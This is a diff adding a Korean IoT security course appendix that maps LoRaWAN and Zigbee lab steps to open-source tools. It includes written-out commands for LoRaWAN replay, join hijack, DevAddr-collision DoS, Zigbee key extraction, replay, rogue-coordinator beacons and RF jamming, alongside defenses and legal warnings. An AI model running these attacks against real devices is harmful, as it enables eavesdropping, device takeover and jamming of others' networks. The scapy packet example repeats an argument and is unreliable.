@@ -648,3 +648,455 @@ graph LR
 
 **학생 액션**: CoAP fuzz.
 
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course17 IoT Security — Week 06 무선 프로토콜·SDR·LoRaWAN·Zigbee·리플레이·재밍)
+
+> 이 부록은 본문 Part 3-5 (LoRa 시뮬 / Zigbee 시뮬 / 리플레이·재밍) 의
+> 모든 시뮬을 *실제 OSS + 저가 SDR* 시퀀스로 매핑한다. course16 week 09
+> (RF/SDR/Sub-GHz) + course17 w02 (BLE/Zigbee/LoRa 기초) 부록 보강 —
+> *LoRaWAN 심화 stack* (chirpstack network/app server) + *Zigbee mesh
+> 운영* (Zigbee2MQTT) + *gr-lora / gr-zigbee* (GNU Radio 무선 데모듈) +
+> *LoRaPWN* 공격 + *Wireshark plugin* (lora-shark, zbee dissector). 모든
+> RF 송신은 한국 전파법 §29·§80 적용 — 차폐실 / 본인 자산 한정.
+
+### lab step → 도구 매핑 표
+
+| step | 본문 위치 | 학습 항목 | 본문 명령 (시뮬) | 핵심 OSS 도구 (실 명령) | 도구 옵션 |
+|------|----------|----------|----------------|-------------------------|-----------|
+| s1 | 3.1 | LoRa packet 작성 | Python struct | LoRaWAN-MAC-NodeJS / chirpstack-simulator | `simulator --device-eui` |
+| s2 | 3.x | LoRaWAN OTAA join | (시뮬) | chirpstack-network-server / lora-app-server | OTAA flow |
+| s3 | 3.x | LoRaWAN ABP | (시뮬) | chirpstack ABP mode / RAK 보드 + Python | ABP keys |
+| s4 | 3.x | LoRa SDR 캡처 | (시뮬) | gr-lora / single_rx / RTL-SDR + GNU Radio | gr-lora flowgraph |
+| s5 | 3.x | LoRaWAN 공격 | (시뮬) | LoRaPWN / lorawan-attacks / RAK 보드 PoC | replay/join hijack |
+| s6 | 4.x | Zigbee scan | (시뮬) | killerbee zbstumbler / Zigbee2MQTT | week 02 부록 |
+| s7 | 4.x | Zigbee sniff | (시뮬) | killerbee zbdump / wireshark zbee | .pcap |
+| s8 | 4.x | Zigbee key 추출 | (시뮬) | killerbee zbgoodfind / KillerBee KB-RZUSB | join 시 |
+| s9 | 4.x | Zigbee replay | (시뮬) | killerbee zbreplay | counter |
+| s10 | 4.x | Zigbee fuzzing | (시뮬) | KillerBee zbfakebeacon / scapy 802.15.4 | mutation |
+| s11 | 5.x | RF 재밍 | (시뮬) | hackrf_transfer noise / mdk4 (WiFi) / lorapwn jam | 차폐 |
+| s12 | 5.x | 리플레이 | Python 캡처+송신 | URH / hackrf_transfer / Flipper Zero | week 09 |
+| s13 | (추가) | LoRa SDR 디코드 | (없음) | gr-lora / lora-shark Wireshark plugin | post-process |
+| s14 | (추가) | Zigbee Wireshark | (없음) | wireshark zbee_nwk + zbee_zcl + 802.15.4 | dissector |
+| s15 | (추가) | 운영 Zigbee 통합 | (없음) | Zigbee2MQTT / Home Assistant | smart home |
+
+### 무선 프로토콜 OSS 도구 카테고리 매트릭스 (LoRa + Zigbee 심화)
+
+| 카테고리 | 사례 | 대표 도구 (OSS) | 비고 |
+|---------|------|----------------|------|
+| **LoRa — chip lib** | end-device 펌웨어 | LoRaMAC-Node / LoRaMAC-Go / Stuart Robinson lib | 표준 |
+| **LoRa — gateway** | concentrator | Semtech packet-forwarder / lora-net | 표준 |
+| **LoRa — network server** | LoRaWAN 통합 | chirpstack-network-server / lorawan-server (Erlang) | full stack |
+| **LoRa — app server** | uplink → MQTT/HTTP | chirpstack-application-server | full stack |
+| **LoRa — gateway bridge** | UDP → MQTT | chirpstack-gateway-bridge / packetbroker | bridge |
+| **LoRa — simulator** | 가상 device | chirpstack-simulator (Go) / LoRaWAN-stack-NodeJS | 학습 |
+| **LoRa — SDR demod** | bin → bits | gr-lora (GNU Radio) / single_channel_pkt_fwd | RX 전용 |
+| **LoRa — Wireshark** | .pcap 분석 | lora-shark plugin / lorawan-pcap-tools | 분석 |
+| **LoRa — 공격** | replay / join hijack | LoRaPWN / lorawan-attacks / dragino-PoC | lab |
+| **Zigbee — sniff** | dongle 기반 | killerbee + Atmel Raven / Apimote / nRF52840-zigbee | 802.15.4 |
+| **Zigbee — bridge** | mesh → MQTT | Zigbee2MQTT / zigbee2tasmota / deCONZ | 운영 |
+| **Zigbee — wireshark** | .pcap 분석 | wireshark zbee_nwk / zbee_zcl / 802.15.4 | dissector |
+| **Zigbee — 공격** | replay / fuzz | killerbee zbreplay / zbfakebeacon / scapy 802.15.4 | lab |
+| **Zigbee — 분석** | network key | killerbee zbgoodfind | join packet |
+| **Zigbee — Wireshark key** | decrypt | wireshark TC link key + nwk key 입력 | preferences |
+| **Zigbee — gateway open** | smart home | Home Assistant + ZHA / Zigbee2MQTT | 운영 |
+| **OQPSK / BPSK / FSK demod** | low level | gr-osmosdr + GNU Radio companion | DSP |
+| **재밍 (RF)** | 차폐실 한정 | hackrf_transfer + /dev/zero / single tone | 전파법 |
+| **6LoWPAN** | IPv6 over 802.15.4 | contiki-ng / RIOT OS / Tinyos / sniffles | embedded |
+| **Wi-SUN** | mesh + IPv6 | wisunsim / wisun-fan-stack | 미래 |
+| **Thread / Matter** | smart home | OpenThread / nRF Connect SDK / Matter SDK | 차세대 |
+
+### 학생 환경 준비
+
+```bash
+# attacker VM — w02 부록 보강 + LoRa/Zigbee 심화
+sudo apt-get update
+sudo apt-get install -y \
+   gnuradio gnuradio-dev gr-osmosdr \
+   wireshark wireshark-common tshark \
+   python3-pip python3-venv \
+   socat ncat
+
+# w02 부록 도구 (이미 설치 — 확인)
+# - chirpstack docker compose (lab)
+# - killerbee
+# - LoRaWAN-MAC-NodeJS
+
+# gr-lora (GNU Radio LoRa demodulator)
+git clone https://github.com/rpp0/gr-lora /tmp/gr-lora
+cd /tmp/gr-lora && mkdir build && cd build && cmake .. && make -j$(nproc)
+sudo make install && sudo ldconfig
+
+# gr-zigbee (또는 IEEE 802.15.4 OQPSK)
+git clone https://github.com/bastibl/gr-ieee802-15-4 /tmp/gr-15-4
+cd /tmp/gr-15-4 && mkdir build && cd build && cmake .. && make
+sudo make install
+
+# lora-shark (Wireshark LoRa plugin)
+git clone https://github.com/rpp0/lora-shark /tmp/lora-shark
+cd /tmp/lora-shark && make
+sudo cp lora-shark.so ~/.config/wireshark/plugins/
+
+# LoRaPWN (LoRaWAN 공격 PoC)
+git clone https://github.com/IOActive/lorapwn /tmp/lorapwn
+cd /tmp/lorapwn && pip3 install --user -r requirements.txt
+
+# chirpstack-simulator
+go install -v github.com/brocaar/chirpstack-simulator/cmd/chirpstack-simulator@latest
+
+# Wireshark Zigbee key 사전 설정 (preference)
+mkdir -p ~/.config/wireshark
+cat << 'EOF' >> ~/.config/wireshark/preferences
+zbee_nwk.key1: ZigBeeAlliance09
+zbee_nwk.label1: Trust Center Default Key
+EOF
+
+# Home Assistant + ZHA (Zigbee 운영 — w02 부록 docker)
+docker run -d --name homeassistant --restart=unless-stopped \
+   -e TZ=Asia/Seoul -v /opt/ha:/config \
+   --network=host \
+   ghcr.io/home-assistant/home-assistant:stable
+
+# OpenThread (Thread 표준 — Matter 기반)
+git clone https://github.com/openthread/openthread /tmp/openthread
+cd /tmp/openthread && ./script/bootstrap
+
+# 검증
+gnuradio-companion --version 2>&1 | head -1
+ls /usr/local/lib/*lora* 2>/dev/null
+ls ~/.config/wireshark/plugins/
+chirpstack-simulator --help 2>&1 | head -3
+docker ps | grep -E "chirpstack|home"
+```
+
+> **TX 의무 재확인**: 모든 RF 송신 (LoRa / Zigbee / hackrf jam) 은 한국
+> 전파법 §29 + §80 적용. 차폐실 / 본인 자산 / RF 격리 lab 한정.
+
+### 핵심 도구별 상세 사용법
+
+#### 도구 1: chirpstack-simulator — LoRaWAN 가상 device (s1-s3)
+
+본문 Python LoRaWANPacket class → chirpstack-simulator 의 *완성된 가상
+LoRa device* 로 OTAA / ABP / uplink 모두 시뮬.
+
+```bash
+# 1. chirpstack-simulator 설치 + 시작
+cd /tmp/chirpstack && docker compose up -d
+firefox http://localhost:8080  # admin/admin
+
+# Web UI 흐름:
+#   - Network server 등록
+#   - Service profile 생성
+#   - Application 생성
+#   - Device profile (KR920 / EU868 / US915)
+#   - End device 등록 (DevEUI 자동, AppKey 자동)
+
+# 2. simulator 실행 (가상 device 100대)
+chirpstack-simulator \
+   --service-profile-id <UUID> \
+   --device-count 100 \
+   --uplink-interval 30s \
+   --frequency 922100000 \
+   --bandwidth 125000 \
+   --spreading-factor 7
+
+# 3. uplink 데이터 확인 (chirpstack web UI → Application → Device Data)
+
+# 4. raw uplink (MQTT — chirpstack 의 application server 출력)
+mosquitto_sub -h localhost -t 'application/+/device/+/event/up' -v
+# {"applicationID":"1","deviceName":"sim-001","data":"AAEC","fCnt":42,...}
+
+# 5. downlink 송신 (네트워크 → device)
+curl -X POST http://localhost:8080/api/devices/<DevEUI>/queue \
+   -H "Authorization: Bearer $JWT" \
+   -d '{"data":"BASE64...","fPort":1,"confirmed":true}'
+
+# 6. ABP 모드 (key 사전 설정 — 보안 약함)
+# Web UI: Device → Activation → ABP
+# DevAddr / NwkSKey / AppSKey 직접 입력
+
+# 7. 실 RAK 보드 (US$50 — 실 device 학습)
+# RAK4631 (nRF52840 + SX1262)
+# https://docs.rakwireless.com/Product-Categories/WisDuo/RAK4631/Quickstart/
+```
+
+#### 도구 2: gr-lora — RTL-SDR + GNU Radio 로 LoRa demod (s4)
+
+본문 시뮬 → 실 LoRa 신호 캡처 → demod → bit stream. RTL-SDR 만 (~$25)
+으로 LoRa 신호 가능.
+
+```bash
+# 1. GNU Radio Companion 시작
+gnuradio-companion &
+
+# 2. flowgraph 작성 (또는 gr-lora 예제 사용)
+ls /usr/local/share/gr-lora/examples/
+# lora_receive_realtime.grc
+# lora_replay.grc
+
+gnuradio-companion /usr/local/share/gr-lora/examples/lora_receive_realtime.grc
+
+# 3. 실시간 LoRa 수신 (KR920 시뮬 — 상용 LoRa 신호 차폐)
+# Source: RTL-SDR (922.1 MHz, 1.024 Msps)
+# Block: lora_receiver (BW=125kHz, SF=7, CR=4/8)
+# Sink: file (/tmp/lora-bits.bin) + UDP socket
+
+# 4. CLI 모드 (Python script — 비대화형)
+python3 << 'PY'
+from gnuradio import gr, blocks
+from gnuradio.lora import lora_receiver
+import osmosdr
+
+class LoRaRX(gr.top_block):
+    def __init__(self):
+        gr.top_block.__init__(self)
+        src = osmosdr.source(args="numchan=1")
+        src.set_sample_rate(1.024e6)
+        src.set_center_freq(922.1e6)
+        src.set_gain(40)
+
+        rx = lora_receiver(samp_rate=1024000, center_freq=int(922.1e6),
+                           channel_list=([922100000]),
+                           sf=7, conv_decoding=False, crc=True, reduced_rate=False,
+                           disable_drift_correction=False, disable_channel_decoding=False)
+
+        sink = blocks.message_debug()
+        self.connect(src, rx)
+        self.msg_connect((rx, 'frames'), (sink, 'print'))
+
+tb = LoRaRX()
+tb.start()
+import time; time.sleep(60)
+tb.stop()
+PY
+
+# 5. lora-shark — .pcap 형식으로 저장 + Wireshark
+# gr-lora 의 LoRa Tap block → .pcap → wireshark
+wireshark /tmp/lora.pcap
+# Filter: lora || lorawan
+```
+
+#### 도구 3: LoRaPWN — LoRaWAN 공격 PoC (s5)
+
+본문 *리플레이/재밍* 의 LoRa 특화. lorapwn 은 *join hijack* (AppKey 탈취
+시) + *replay* (counter 미리 캡처) + *DevAddr collision DoS*.
+
+```bash
+# 1. lorapwn — replay attack (counter 미리 캡처 시)
+cd /tmp/lorapwn
+
+python3 lorapwn.py replay \
+   --pcap /tmp/captured.pcap \
+   --dev-eui ABCDEF0123456789 \
+   --frequency 922.1e6
+
+# 2. join hijack (AppKey 평문 노출 시 — 학술 PoC)
+python3 lorapwn.py join_hijack \
+   --app-key 0123456789ABCDEF0123456789ABCDEF \
+   --target-app-id 1
+
+# 3. DevAddr collision (DoS — counter 충돌 유도)
+python3 lorapwn.py devaddr_collision \
+   --target-devaddr 26011BDA \
+   --frequency 922.1e6
+
+# 4. frame counter sync attack
+# - 정상 device 의 counter 가 N
+# - 공격자가 N+1, N+2 송신 → 정상 device 송신이 무시됨
+
+# 5. 방어 — chirpstack 의 strict frame counter
+# Web UI: Device profile → frame_counter_validation: true
+# (replay 차단)
+
+# 6. LoRaWAN 1.1 vs 1.0.x
+# 1.0.x: 단일 NwkSKey + AppSKey
+# 1.1: forward / backward NwkSKey 분리 (replay 더 어렵게)
+# 마이그레이션 권장
+```
+
+#### 도구 4: killerbee 심화 — Zigbee 공격 통합 (s6-s10)
+
+w02 부록 보강 — *zbreplay (replay)* + *zbgoodfind (network key 추출)* +
+*zbfakebeacon (rogue coordinator)* + *scapy 802.15.4* (custom packet).
+
+```bash
+# 1. Zigbee channel scan (w02 부록 동일)
+sudo zbstumbler -i 1:5
+
+# 2. 캡처 (특정 채널)
+sudo zbdump -f 15 -w /tmp/zigbee.pcap
+
+# 3. Wireshark — Zigbee 분석
+wireshark /tmp/zigbee.pcap
+# Filter: zbee_nwk
+# Edit → Preferences → Protocols → ZigBee
+# - Network keys: ZigBeeAlliance09 (TC default)
+# - Network keys: <발견된 key>
+# 자동 decrypt
+
+# 4. zbreplay — 캡처한 명령 재전송 (조명 on/off)
+sudo zbreplay -f 15 -r /tmp/zigbee.pcap -j
+
+# 5. zbgoodfind — join packet 에서 network key 추출
+sudo zbgoodfind -f 15 -w /tmp/keys.txt
+# (디바이스 join 시점에 sniff)
+
+# 6. zbfakebeacon — rogue coordinator (디바이스 끌어오기)
+sudo zbfakebeacon -f 15 -p 0x1234 -i 1:5
+
+# 7. scapy 802.15.4 (custom packet)
+python3 << 'PY'
+from scapy.all import *
+
+# Zigbee Network Layer
+nwk = ZigbeeNWK(
+    frametype=0,           # 0=Data, 1=Command
+    proto_version=2,
+    discover_route=0,
+    flags=0,
+    radius=8,
+    seqnum=42,
+    destination=0x0000,    # broadcast
+    source=0x1234,
+    radius=10
+)
+
+# 802.15.4 MAC
+mac = Dot15d4(
+    fcf_frametype=1,        # 1=Data
+    fcf_security=0,
+    fcf_pending=0,
+    fcf_ackreq=1,
+    fcf_panidcompress=1,
+    fcf_destaddrmode=2,     # short
+    fcf_srcaddrmode=2,
+    seqnum=42,
+    dest_panid=0x1234,
+    dest_addr=0x0000,
+    src_addr=0x1234
+)
+
+pkt = mac/nwk/Raw(load=b"hello zigbee")
+hexdump(pkt)
+# 송신 (KillerBee dongle)
+# kb = killerbee.KillerBee()
+# kb.set_channel(15)
+# kb.inject(bytes(pkt))
+PY
+
+# 8. zbid (디바이스 ID 식별)
+sudo zbid
+
+# 9. Wireshark 의 Zigbee 키 자동 decrypt 검증
+# 캡처 → Analyze → Enabled Protocols → ZigBee 활성
+# 자동 cluster (lighting / sensor / OnOff) decode
+```
+
+#### 도구 5: Zigbee2MQTT — 운영 Zigbee → MQTT 통합 (s15)
+
+운영 환경에서 Zigbee mesh 를 MQTT 로 통합. 보안 측면 — 단일 manager + audit.
+
+```bash
+# 1. docker
+docker run -d --name zigbee2mqtt \
+   -v /opt/zigbee2mqtt/data:/app/data \
+   -v /run/udev:/run/udev:ro \
+   --device=/dev/ttyACM0 \
+   -e TZ=Asia/Seoul \
+   koenkk/zigbee2mqtt
+
+# 2. config (/opt/zigbee2mqtt/data/configuration.yaml)
+cat << 'EOF' > /opt/zigbee2mqtt/data/configuration.yaml
+mqtt:
+  base_topic: zigbee2mqtt
+  server: 'mqtt://10.20.30.80:1883'
+  user: zigbee
+  password: secret
+
+serial:
+  port: /dev/ttyACM0
+
+permit_join: false   # 운영 — 새 device join 차단
+
+advanced:
+  network_key: GENERATE   # 강력한 random key 사용 (default 금지)
+  pan_id: GENERATE
+  ext_pan_id: GENERATE
+  channel: 15
+  log_level: info
+  log_directory: '/app/data/log/%TIMESTAMP%'
+  homeassistant: true
+
+frontend:
+  port: 8085
+EOF
+
+docker restart zigbee2mqtt
+firefox http://localhost:8085
+
+# 3. Web UI 흐름:
+#   - Devices: 모든 mesh device 목록 (ID / IEEE / model)
+#   - Map: mesh topology 시각화
+#   - Logs: 실시간 alert
+#   - Settings: network_key 변경 / channel 변경
+
+# 4. permit_join 동적 (새 device 등록 시만)
+mosquitto_pub -t 'zigbee2mqtt/bridge/request/permit_join' \
+   -m '{"value": true, "time": 60}' -h 10.20.30.80
+
+# 5. 보안 — bridge audit
+mosquitto_sub -t 'zigbee2mqtt/bridge/event' -h 10.20.30.80
+# {"data":{"friendly_name":"0x...", "ieee_address":"0x..."},"type":"device_joined"}
+# 새 device join 즉시 SIEM alert
+```
+
+### LoRa / Zigbee 공격 → 방어 매트릭스 (w02 보강)
+
+| 공격 | 1차 도구 | 방어 |
+|------|----------|------|
+| LoRa OTAA join hijack | lorapwn (AppKey 탈취 시) | LoRaWAN 1.1 + HSM 보관 |
+| LoRa ABP replay | RTL-SDR + gr-lora 캡처 + replay | strict frame counter validation |
+| LoRa frame counter sync | counter 사전 캡처 | sliding window (max diff 32768) |
+| LoRa DevAddr collision | lorapwn | unique DevAddr 강제 |
+| LoRa jamming | hackrf_transfer + 차폐 | adaptive channel hopping |
+| Zigbee TC default key | killerbee zbgoodfind | install code + unique key |
+| Zigbee replay | zbreplay | frame counter strict |
+| Zigbee fakebeacon | zbfakebeacon | network key + permit_join false |
+| Zigbee fuzz | scapy + KillerBee | rate limit + watchdog |
+| 6LoWPAN RPL DoS | scapy + RPL crafted packet | RPL secure mode |
+
+### 학생 자가 점검 체크리스트
+
+- [ ] chirpstack docker compose 부팅 + Web UI 접근 + 가상 device 등록 1회
+- [ ] chirpstack-simulator 로 100 가상 device uplink 송신 1회
+- [ ] gr-lora 의 lora_receive_realtime.grc 1회 실행 (RTL-SDR 또는 captured pcap)
+- [ ] killerbee zbstumbler + zbdump → wireshark 자동 decrypt 1회 (TC key)
+- [ ] scapy 802.15.4 custom packet 1개 작성 (송신 없이 hexdump 확인)
+- [ ] Zigbee2MQTT 부팅 + MQTT 메시지 모니터 1회 (lab 가상 device)
+- [ ] LoRaWAN 1.0 vs 1.1 의 *키 분리* 답변 가능 + replay 방어 차이
+- [ ] Zigbee Trust Center default key (ZigBeeAlliance09) 의 위험 답변
+- [ ] OQPSK / FSK / GFSK / CSS 4 변조 방식 + 사용 프로토콜 매핑 답변
+- [ ] 본 부록 모든 RF TX 명령에 대해 "외부 송신 시 위반 법조항" 답변 가능
+
+### 운영 환경 적용 시 주의
+
+1. **LoRaWAN 1.1 마이그** — 1.0.x 의 join 공격 위험 → 1.1 (forward /
+   backward key 분리). 신규 device 1.1 의무.
+2. **AppKey HSM 보관** — LoRa device 의 AppKey 평문 보관 금지. ATECC608A
+   / TPM 2.0 / SE05x secure element.
+3. **chirpstack frame counter validation** — 운영 적용 시 *strict* 모드.
+   counter 회복 메커니즘 설계 (자연 reboot 시 상승 허용 범위).
+4. **Zigbee install code 의무** — default ZigBeeAlliance09 키 절대 금지.
+   각 device 16-byte unique install code.
+5. **Zigbee2MQTT permit_join false** — 운영 시 *항상 false*. 새 device 등록
+   시만 일시 true (1분).
+6. **RF 격리** — gr-lora / lorapwn / hackrf_transfer 모든 TX 는 RF 차폐
+   실 한정. 외부 누설 시 전파법 §29 위반.
+7. **Wireshark 키 보관** — 분석 시 입력한 network key 는 ~/.config/wireshark
+   에 저장됨. 외부 공유 PC 사용 후 삭제 필수.
+
+> 본 부록은 *학습 시연용 OSS 시퀀스* 이다. 모든 무선 프로토콜 공격은
+> RF 격리 + 본인 자산 한정. 외부 LoRa / Zigbee device 한 packet 도 송신/
+> 청취 시 전파법 §29 + 통신비밀보호법 §3 위반 가능.
+
+---
